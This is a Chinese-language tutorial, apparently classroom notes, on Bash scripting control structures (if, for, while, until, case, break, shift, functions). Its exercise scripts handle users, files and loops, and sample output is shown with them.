<h3 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h3><p>test 判断—————man test 查看的相关的判断指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> 	数字的判断 	字符的判断 	文件的判断</span><br><span class="line">-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">-le 小于等于 	-n 非空 	</span><br><span class="line">-ne 不等于 	-a 逻辑与</span><br><span class="line">-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>
<pre><code>注意 ：
* [ ] 括号两边有空格
* 判断符号两边有空格</code></pre><h3 id="if-语法格式"><a href="#if-语法格式" class="headerlink" title="if 语法格式"></a>if 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if condition	--&gt;condition 指的是判断的条件</span><br><span class="line">then		</span><br><span class="line">	CMD1	--&gt; CMD1 指的是满足判断条件后执行的语句</span><br><span class="line">else</span><br><span class="line">	CMD2	--&gt; CMD2 指的是不满足判断条件执行的语句 then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">	CMD1</span><br><span class="line">elif condition</span><br><span class="line">	CMD2</span><br><span class="line">else</span><br><span class="line">	CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。
2. 三个数字比大小，输出最大的
3. 三个数字比大小,并且按从大到小排列</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	n1=<span class="variable">$1</span></span><br><span class="line">	n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	n1=<span class="variable">$2</span></span><br><span class="line">	n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	max=<span class="variable">$n1</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		be=<span class="variable">$n2</span></span><br><span class="line">		min=<span class="variable">$3</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		be=<span class="variable">$3</span></span><br><span class="line">		min=<span class="variable">$n2</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	max=<span class="variable">$3</span></span><br><span class="line">	be=<span class="variable">$n1</span></span><br><span class="line">	min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br></pre></td></tr></table></figure>


<h3 id="for-语法格式"><a href="#for-语法格式" class="headerlink" title="for 语法格式"></a>for 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for 变量 in 取值范围</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h4 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围</h4><ul>
<li><p>以空格分割</p>
<pre><code>for i in 1 2 3
for i in 5 7 10
for i in a b c</code></pre><p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">	ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">	ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
</li>
<li><p>以{}罗列        {1..10}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以使用seq	$(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">		&#96;seq 1 10&#96;</span><br><span class="line">		seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">		seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
<li>统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid”</li>
<li>依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件</li>
<li>输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些</li>
<li>计算某个命令执行的时间</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 系统中一共有：`cat /etc/passwd |wc -l`个用户</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	username=<span class="variable">$i</span></span><br><span class="line">	uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">系统中一共有：22个用户</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /var目录中一共有`ls -l /var/|wc -l`个文件</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/var目录中一共有21个文件</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入用户名："</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入文件SIZE的最大值："</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> 执行的时间为 <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz 执行的时间为 2</span><br></pre></td></tr></table></figure>

<h4 id="拓展题"><a href="#拓展题" class="headerlink" title="拓展题"></a>拓展题</h4><ol>
<li>画斜线正反<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li>
<li>写一个9*9乘法表</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#行数	空格	*数量</span></span><br><span class="line"><span class="comment">#1 	0 	1</span></span><br><span class="line"><span class="comment">#2	1	1</span></span><br><span class="line"><span class="comment">#3	2	1</span></span><br><span class="line"><span class="comment">#n	n-1	1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-1))`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=2	2*2=4</span></span><br><span class="line"><span class="comment">#3*1=3	3*2	3*3</span></span><br><span class="line"><span class="comment">#9*1	9*2				9*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="variable">$(($i*$j)</span>) "</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure>

<h3 id="while-语法格式"><a href="#while-语法格式" class="headerlink" title="while 语法格式"></a>while 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	while condition 指的是判断的条件</span><br><span class="line">	do</span><br><span class="line">		CMD</span><br><span class="line">	done</span><br><span class="line">数字的判断 	字符的判断 	文件的判断</span><br><span class="line">	-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">	-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">	-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">	-le 小于等于 	-n 非空 	</span><br><span class="line">	-ne 不等于 	-a 逻辑与</span><br><span class="line">	-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>


<ol>
<li>当什么的时候就做什么,体验无限循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">	cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">当山峰没有棱角的时候</span><br><span class="line">当河水不再流</span><br><span class="line">。。。</span><br><span class="line">我哈哈ishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
<li>不满足条件跳出循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">判断/tmp/whilefile2是否存在，不存在的时候我们去创建</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">	cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="until-语法格式"><a href="#until-语法格式" class="headerlink" title="until 语法格式"></a>until 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">until condition --&gt; 不满足 condition, 则执行 cmd</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 连乘算法 while和until
2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
userlist文件的格式如下：
carol 777 tom uplooking
natasha 778 tom uplooking
r1 779 tom uplooking
3. 要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
[root@rhel6 ~]# cat /tmp/useraddlist1
dabao 888 xuexi,it uplooking
lucy 889 sales,it uplooking
lily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	A=(<span class="variable">$a</span>)</span><br><span class="line">	groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure>

<h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol>
<li>完成今天课上的所有练习题目</li>
<li>石子游戏：有n石子，谁拿到最后一个石子谁赢，<br>用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的</li>
<li>创建一个以今天日期为名的目录20160811;<br>将/目录下所有以.sh结尾的文件复制到新创建的目录中；<br>将该目录打包压缩存到/tmp目录下保存。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"游戏开始！请玩家指定石子的个数:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家指定每次取石子的最多个数:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+1)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">read</span> -p <span class="string">"请玩家取石子:"</span> w</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我取 <span class="variable">$((($n2+1)</span>-<span class="variable">$w</span>)) 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+1)))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	[ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"你输了@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我先取 <span class="variable">$k</span> 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	q=<span class="variable">$n1</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="case-语法格式"><a href="#case-语法格式" class="headerlink" title="case 语法格式"></a>case 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case 取值 in</span><br><span class="line">取值 1)</span><br><span class="line">	CMD1 ;</span><br><span class="line">	cmd11;</span><br><span class="line">	cmd12;;</span><br><span class="line">取值 2)</span><br><span class="line">	CMD2 ;;</span><br><span class="line">取值 3)</span><br><span class="line">	CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">	CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
<p>* 代表除了以上所有的取值 , 做某一些操作</p>
<h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
<li>请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">	exit;;</span><br><span class="line">*)</span><br><span class="line">	read -p "请问你是否喜欢shell脚本？" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？no</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？iii</span><br><span class="line">请问你是否喜欢shell脚本？fuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">请问你是否喜欢shell脚本？...</span><br><span class="line">请问你是否喜欢shell脚本？^^^[[D</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br></pre></td></tr></table></figure>



<h3 id="continue-语法格式"><a href="#continue-语法格式" class="headerlink" title="continue 语法格式"></a>continue 语法格式</h3><pre><code>continue 作用于循环语句中 代表跳出这个循环进入下个循环 .</code></pre><h4 id="课堂练习-4"><a href="#课堂练习-4" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="2">
<li>要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出）</li>
</ol>
<h3 id="break-语法格式"><a href="#break-语法格式" class="headerlink" title="break 语法格式"></a>break 语法格式</h3><pre><code>break 作用于循环语句中 代表直接跳出该循环 .</code></pre><h4 id="课堂练习-5"><a href="#课堂练习-5" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="3">
<li>要求找出系统中属于student用户的一个文件.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">	<span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="shift-语法格式"><a href="#shift-语法格式" class="headerlink" title="shift 语法格式"></a>shift 语法格式</h3><pre><code>位置参数</code></pre><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 代表的是输入的第一个参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 代表的是输入的第二个参数 ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 代表的是 bash 程序本身名</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># 代表的是参数的个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; 超过的两位的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;或者<span class="variable">$&#123;@&#125;</span> 代表将所有位置参数</span></span><br><span class="line">shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 .</span><br></pre></td></tr></table></figure>
<h4 id="课堂练习-6"><a href="#课堂练习-6" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="4">
<li>显示位置参数的值，以及可执行脚本名称，参数的总数</li>
</ol>
<h3 id="function-语法格式"><a href="#function-语法格式" class="headerlink" title="function 语法格式"></a>function 语法格式</h3><pre><code>functname ()
{
shell commands
}</code></pre><ul>
<li><p>函数的调用</p>
<ol>
<li>直接调用函数– 函数名</li>
<li>传入参数– 函数名 参数1 参数2 参数3</li>
<li>使用return返回函数结束状态</li>
</ol>
</li>
<li><p>函数中的局部变量和全局变量</p>
</li>
</ul>
<p>默认为全局变量，因此不同的函数不可以使用同一个变量；<br>如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。</p>
<ul>
<li>函数返回值 return<br>可以使用return命令来设置返回值；</li>
</ul>
<p>例如 return 0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 课堂练习</span></span><br><span class="line"></span><br><span class="line">5. 创建一个命令booboo，命令用法如下：</span><br><span class="line">booboo -t 30s 	代表睡30s；即-t后跟时间</span><br><span class="line">booboo -l /tmp  代表显示某个目录下面的内容和属性以及目录本身的属性</span><br><span class="line">booboo -r /tmp/file 代表删除某个文件</span><br><span class="line">booboo --<span class="built_in">help</span>	代表帮助信息显示该命令的用法</span><br><span class="line"></span><br><span class="line">6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">	sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">	ls -l <span class="variable">$1</span></span><br><span class="line">	ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">	rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">	SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">	DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">	RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span 